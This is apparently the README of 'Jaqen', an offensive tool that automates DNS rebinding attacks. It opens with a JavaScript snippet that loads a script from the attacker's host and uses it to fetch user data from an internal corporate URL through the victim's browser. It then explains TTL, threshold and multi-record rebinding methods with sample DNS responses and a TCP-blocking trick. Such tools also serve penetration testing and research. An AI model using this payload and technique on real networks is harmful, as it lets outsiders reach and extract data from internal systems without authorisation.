# Jaqen
Dead simple reliable [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) for IPv4 and IPv6.

## Usage
Jaqen abstracts away the complex steps required to perform a DNS rebind and exposes a [HTML5 Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) interface which transparently triggers a DNS rebind:
```html
<script type="text/javascript" src="http://$JAQEN_HOST/v1.js"></script>
<script type="text/javascript">
let r = new DNSRebind();
const target = "http://internal.corp.acme.com/users";
r.fetch(target).then((resp) => resp.json()).then((users) => {
	alert("Extracted the following users:\n" + users.join("\n"));
}, (e) => console.error(e));
</script>
```

## How it works
DNS Rebinding is notoriously unreliable and hard to debug. Jaqen offers a new approach by attempting multiple DNS Rebinding methods at the same time, selecting the first method to succeed then remembering that preferred method for future rebinds. 

This is accomplished by maintaining a pool of IP addresses which can be used when executing rebind attacks. When a request is received resources are selected from the pool based on current utilization and reserved for the duration of the attack. Because Jaqen intelligently allocates and releases these binds when they are no longer in use it can be run with extermely minimal hardware requirements. 

Depending on the target of the attack and runtime configuration Jaqen will select one or more of the following methods:

### Rebinding Methods: TTLRebind
A TTL rebind is the most basic DNS rebinding attack and works by relying on the TTL expiration of DNS records. When the first request is recieved a response is sent with a short TTL (1, 2, 4, 8, 16 seconds) pointing to the Jaqen host (ex. 203.0.113.1):
```
;; QUESTION SECTION:
;00000000-0000-0000-0000-000000000000.jaqen.local.			IN	A

;; ANSWER SECTION:
00000000-0000-0000-0000-000000000000.jaqen.local.		2	IN	A	203.0.113.1
```
After the first request is sent all future responses point to the target of the rebind (192.168.1.1) relying on the automatic TTL expiration on the client:
```
;; QUESTION SECTION:
;00000000-0000-0000-0000-000000000000.jaqen.local.			IN	A

;; ANSWER SECTION:
00000000-0000-0000-0000-000000000000.jaqen.local.		2	IN	A	192.168.1.1
```

### Rebinding Methods: ThresholdRebind
A Threshold rebind is a designed to target systems which trigger multiple DNS requests (common with server misconfigurations or when IDS is in use) or where unknown minimum TTLs are enforced. When a request is recieved a response is sent with a short TTL (1, 2, 4, 8, 16 seconds) pointing to the Jaqen host (ex. 203.0.113.1):
```
;; QUESTION SECTION:
;00000000-0000-0000-0000-000000000000.jaqen.local.			IN	A

;; ANSWER SECTION:
00000000-0000-0000-0000-000000000000.jaqen.local.		2	IN	A	203.0.113.1
```
All the requests are answered with the same Jaqen host response until a threshold of requests (1, 2, 3, 4, etc) is recieved after which all future responses point to the target of the rebind (192.168.1.1):
```
;; QUESTION SECTION:
;00000000-0000-0000-0000-000000000000.jaqen.local.			IN	A

;; ANSWER SECTION:
00000000-0000-0000-0000-000000000000.jaqen.local.		2	IN	A	192.168.1.1
``` 

### Rebinding Methods: MultiRecordRebind
A multiple record rebind is one of the most complex DNS rebinding attacks and is only selected when all other methods have failed. It can be expensive as each simultaneous request requires a unique public IP address on the Jaqen host and can be noisy as requests are not guaranteed to succeed relying on undefined behavior. When a request is recieved a response is sent with containing both the Jaqen host (ex. 203.0.113.1) and target of the rebind (192.168.1.1):
```
;; QUESTION SECTION:
;00000000-0000-0000-0000-000000000000.jaqen.local.			IN	A

;; ANSWER SECTION:
00000000-0000-0000-0000-000000000000.jaqen.local.		2	IN	A	203.0.113.1
00000000-0000-0000-0000-000000000000.jaqen.local.		2	IN	A	192.168.1.1
```
The rebind relies on the DNS answers remaining in the same order, when the browser makes the initial HTTP request a response is generated by Jaqen, then the client IP address is blacklisted at the TCP layer. All future requests fail falling through to the second DNS answer, the target of the rebind. This block remains in-place until the attack completes then the block is removed. In order to target users behind a NAT each multiple record rebind is allocated a unique public IP address.